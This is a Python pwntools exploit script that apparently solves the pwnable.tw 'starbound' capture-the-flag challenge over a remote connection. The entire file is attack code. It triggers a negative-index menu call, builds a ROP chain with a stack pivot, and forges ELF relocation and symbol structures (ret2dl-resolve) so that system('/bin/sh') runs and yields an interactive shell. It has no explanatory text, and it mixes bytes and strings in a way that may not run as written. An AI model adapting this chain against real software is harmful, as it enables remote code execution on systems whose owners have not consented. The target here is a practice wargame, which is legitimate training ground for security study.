#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./starbound')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10202)

name_addr = 0x080580D0

def set_name(name):
    sa('> ', '6')
    sa('> ', '2')
    sla('Enter your name: ', name)

# 0x0804a0b8 : add esp, 0x14 ; pop ebx ; pop esi ; ret
add_esp_ret = 0x0804a0b8
pop3_ret = 0x080494da
pop_ebp_ret = 0x080491bc
leave_ret = 0x08048c58
read_plt = elf.plt['read']
write_plt = elf.plt['write']
bss_buf = 0x08058500
link_map_addr = 0x8055004
dl_runtime_resolve = 0x8055008
dynsym = 0x080481dc
dynstr = 0x080484fc
open_got = elf.got['open']
open_plt = elf.plt['open']
plt0 = 0x8048940

# control rip to overflow return address
set_name(up32(add_esp_ret))
#gdb.attach(p, 'b _dl_runtime_resolve\nb _dl_fixup\nb _dl_lookup_symbol_x\nc')
#gdb.attach(p, 'b _dl_runtime_resolve\nb *(do_system+1092)\nc')
#payload = cyclic(0xfc)
payload = (
    up32(0xdeadbeef) + # padding
    up32(read_plt) + up32(pop3_ret) + up32(0) + up32(bss_buf) + up32(0x200) + # read(0, bss_buf, 0x200)
    up32(write_plt) + up32(pop3_ret) + up32(1) + up32(link_map_addr) + up32(0x4) + # write(1, link_map_addr, 0x5)
    up32(read_plt) + up32(pop3_ret) + up32(0) + up32(bss_buf + 0x100 + 0x4) + up32(0x200) + # read(0, bss_buf + 0x100, 0x200)
    up32(pop_ebp_ret) + up32(bss_buf + 0x100) + up32(leave_ret) # stack pivot
)
assert len(payload) <= 0xfc
sa('> ', '-33\x00' + payload)

# read fake structures
payload = (
    # Elf32_Rel
    p32(open_got) + # r_offset
    p32(0x7 | (((bss_buf + 0xc - dynsym) / 16) << 8)) + # r_info
    p32(0) + # padding
    # Elf32_Sym <= bss_buf + 0xc
    p32(bss_buf + 0x1c - dynstr) + # st_name
    p32(0) + # st_value
    p32(0) + # st_size
    p32(0x12) + # st_info
    # bss_buf + 0x1c
    'system\x00\x00' +
    '/bin/sh\x00'
)
raw_input('@')
s(payload)

# get &link_map address
link_map = uu32(r(4))
info('link_map = ' + hex(link_map))

# read new rop chain
payload = (
    up32(read_plt) + up32(pop3_ret) + up32(0) + up32(link_map + 0xd4) + up32(0x28) + # read(0, bss_buf, 0x200)
    up32(plt0) + up32(0xfd38) + up32(0xdeadbeef) + up32(bss_buf + 0x24) # call resolver to get shell
)
raw_input('@')
s(payload)

# fillup l_info array
raw_input('@')
s('\x00' * 0x28)

p.interactive()

